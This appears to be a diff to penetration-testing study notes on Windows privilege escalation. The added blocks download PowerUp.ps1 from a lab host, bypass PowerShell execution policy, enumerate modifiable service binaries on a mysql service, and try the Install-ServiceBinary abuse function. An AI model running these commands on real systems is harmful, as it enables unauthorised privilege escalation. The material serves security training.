@@ -39,6 +39,71 @@ PS:> iwr -uri http://192.168.45.189/Seatbelt.exe -Outfile Seatbelt.exe
 
 ## PowerUp
 
+
+
+{% code title="Import PowerUp.ps1 and execute Get-ModifiableServiceFile" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+
+PS C:\Users\dave> powershell -ep bypass
+...
+PS C:\Users\dave>  . .\PowerUp.ps1
+
+PS C:\Users\dave> Get-ModifiableServiceFile
+
+...
+
+ServiceName                     : mysql
+Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : BUILTIN\Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
+CanRestart                      : False
+```
+{% endcode %}
+
+{% code title="Error from AbuseFunction" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
+
+Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
+modifiable by the current user.
+At C:\Users\dave\PowerUp.ps1:2178 char:13
++             throw "Service binary '$($ServiceDetails.PathName)' for s ...
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
+    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
+   mysql' for service mysql not modifiable by the current user.
+```
+{% endcode %}
+
+{% code title="Analyzing the function ModifiablePath" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+
+ModifiablePath                IdentityReference Permissions
+--------------                ----------------- -----------
+C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}
+
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+
+ModifiablePath     IdentityReference                Permissions
+--------------     -----------------                -----------
+C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
+C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}
+
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 
+
+PS C:\Users\dave> $ModifiableFiles
+```
+{% endcode %}
+
 PowerUp is a PowerShell script that searches common privilege escalation on the target system. You can run it with the `Invoke-AllChecks` option that will perform all possible checks on the target system or use it to conduct specific checks (e.g. the `Get-UnquotedService` option to only look for potential unquoted service path vulnerabilities).
 
 **Reminder**: To run PowerUp on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can launch PowerShell using the command below.
